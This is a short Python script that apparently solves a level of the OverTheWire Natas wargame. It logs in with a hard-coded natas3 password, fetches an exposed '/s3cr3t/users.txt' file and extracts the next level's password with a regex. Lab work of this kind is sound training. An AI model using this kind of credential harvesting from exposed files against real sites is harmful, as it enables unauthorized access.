import requests
import re

username = 'natas3'
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'

url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt'%username

response = requests.get(url,auth=(username,password))
content = response.text

# print(content)
hashvalue = re.findall("natas4:(.*)",content)[0]
print(hashvalue)